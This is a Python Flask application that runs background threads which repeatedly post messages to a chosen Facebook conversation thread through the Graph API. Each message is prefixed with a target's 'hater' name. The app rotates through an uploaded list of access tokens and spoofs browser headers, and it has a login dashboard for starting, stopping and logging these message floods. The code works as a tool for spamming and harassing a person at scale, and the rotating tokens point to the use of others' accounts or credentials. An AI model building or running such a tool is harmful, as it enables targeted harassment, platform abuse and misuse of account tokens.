from flask import Flask, request, render_template, redirect, url_for, session, jsonify
import requests
import time
import os
import json
import threading
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Replace with a secure key

# Headers for Facebook Graph API
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# File to store user data
USERS_FILE = 'users.json'
# File to store server data
SERVERS_FILE = 'servers.json'
# Dictionary to store active server threads and logs
active_servers = {}
server_logs = {}

# Load users from JSON file
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

# Save users to JSON file
def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=4)

# Load servers from JSON file
def load_servers():
    if os.path.exists(SERVERS_FILE):
        with open(SERVERS_FILE, 'r') as f:
            return json.load(f)
    return {}

# Save servers to JSON file
def save_servers(servers):
    with open(SERVERS_FILE, 'w') as f:
        json.dump(servers, f, indent=4)

# Server messaging function
def run_server(server_id, thread_id, access_tokens, messages, hater_name, speed):
    post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
    num_comments = len(messages)
    max_tokens = len(access_tokens)
    message_index = 0

    while active_servers.get(server_id, {}).get('running', False):
        try:
            token_index = message_index % max_tokens
            access_token = access_tokens[token_index]
            message = messages[message_index].strip()
            parameters = {'access_token': access_token, 'message': hater_name + ' ' + message}
            response = requests.post(post_url, json=parameters, headers=headers)
            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
            log_message = f"[+] SEND SUCCESSFUL No. {message_index + 1} Post Id {post_url} Token No. {token_index + 1}: {hater_name + ' ' + message}\nTime: {current_time}\n\n" if response.ok else f"[x] Failed to send Comment No. {message_index + 1} Post Id {post_url} Token No. {token_index + 1}: {hater_name + ' ' + message}\nTime: {current_time}\n\n"
            server_logs.setdefault(server_id, []).append(log_message)
            message_index = (message_index + 1) % num_comments
            time.sleep(speed)
        except Exception as e:
            log_message = f"[!] Error: {str(e)}\nTime: {current_time}\n\n"
            server_logs.setdefault(server_id, []).append(log_message)
            time.sleep(30)

# Home page (login redirect or dashboard)
@app.route('/')
def index():
    if 'email' not in session:
        return redirect(url_for('login'))
    servers = load_servers()
    return render_template('index.html', servers=servers, email=session['email'])

# Signup route
@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        full_name = request.form.get('full_name')
        email = request.form.get('email')
        password = request.form.get('password')
        users = load_users()
        if email in users:
            return render_template('signup.html', error='Email already exists')
        users[email] = {
            'full_name': full_name,
            'password': generate_password_hash(password)
        }
        save_users(users)
        session['email'] = email
        return redirect(url_for('index'))
    return render_template('signup.html')

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        users = load_users()
        if email in users and check_password_hash(users[email]['password'], password):
            session['email'] = email
            return redirect(url_for('index'))
        return render_template('login.html', error='Invalid email or password')
    return render_template('login.html')

# Logout route
@app.route('/logout')
def logout():
    session.pop('email', None)
    return redirect(url_for('login'))

# Create server route
@app.route('/create_server', methods=['GET', 'POST'])
def create_server():
    if 'email' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        thread_id = request.form.get('threadId')
        hater_name = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        access_tokens = txt_file.read().decode().splitlines()
        messages_file = request.files['messagesFile']
        messages = messages_file.read().decode().splitlines()

        # Create folder and save files
        folder_name = f"Convo_{thread_id}"
        os.makedirs(folder_name, exist_ok=True)
        with open(os.path.join(folder_name, "CONVO.txt"), "w") as f:
            f.write(thread_id)
        with open(os.path.join(folder_name, "token.txt"), "w") as f:
            f.write("\n".join(access_tokens))
        with open(os.path.join(folder_name, "haters.txt"), "w") as f:
            f.write(hater_name)
        with open(os.path.join(folder_name, "time.txt"), "w") as f:
            f.write(str(time_interval))
        with open(os.path.join(folder_name, "message.txt"), "w") as f:
            f.write("\n".join(messages))
        with open(os.path.join(folder_name, "np.txt"), "w") as f:
            f.write("NP")

        # Save server data
        servers = load_servers()
        server_id = str(len(servers) + 1)
        servers[server_id] = {
            'thread_id': thread_id,
            'hater_name': hater_name,
            'time_interval': time_interval,
            'access_tokens': access_tokens,
            'messages': messages,
            'running': False
        }
        save_servers(servers)
        return redirect(url_for('index'))
    return render_template('create_server.html')

# Start server route
@app.route('/start_server/<server_id>')
def start_server(server_id):
    if 'email' not in session:
        return redirect(url_for('login'))
    servers = load_servers()
    if server_id in servers and not servers[server_id].get('running', False):
        servers[server_id]['running'] = True
        save_servers(servers)
        server_thread = threading.Thread(target=run_server, args=(
            server_id,
            servers[server_id]['thread_id'],
            servers[server_id]['access_tokens'],
            servers[server_id]['messages'],
            servers[server_id]['hater_name'],
            servers[server_id]['time_interval']
        ))
        active_servers[server_id] = {'thread': server_thread, 'running': True}
        server_thread.start()
    return redirect(url_for('index'))

# Stop server route
@app.route('/stop_server/<server_id>')
def stop_server(server_id):
    if 'email' not in session:
        return redirect(url_for('login'))
    servers = load_servers()
    if server_id in servers and servers[server_id].get('running', False):
        servers[server_id]['running'] = False
        save_servers(servers)
        active_servers[server_id]['running'] = False
    return redirect(url_for('index'))

# View server logs route
@app.route('/view_logs/<server_id>')
def view_logs(server_id):
    if 'email' not in session:
        return redirect(url_for('login'))
    logs = server_logs.get(server_id, [])
    return render_template('view_logs.html', server_id=server_id, logs=logs)

# Delete server route
@app.route('/delete_server/<server_id>')
def delete_server(server_id):
    if 'email' not in session:
        return redirect(url_for('login'))
    
    servers = load_servers()
    if server_id in servers:
        # Stop server if running
        if servers[server_id].get('running', False):
            servers[server_id]['running'] = False
            if server_id in active_servers:
                active_servers[server_id]['running'] = False
        
        # Get thread_id for folder deletion
        thread_id = servers[server_id].get('thread_id')
        
        # Remove server from servers.json
        del servers[server_id]
        save_servers(servers)
        
        # Remove server logs
        if server_id in server_logs:
            del server_logs[server_id]
        
        # Remove server from active_servers
        if server_id in active_servers:
            del active_servers[server_id]
        
        # Delete server folder if exists
        if thread_id:
            folder_name = f"Convo_{thread_id}"
            import shutil
            if os.path.exists(folder_name):
                shutil.rmtree(folder_name)
    
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)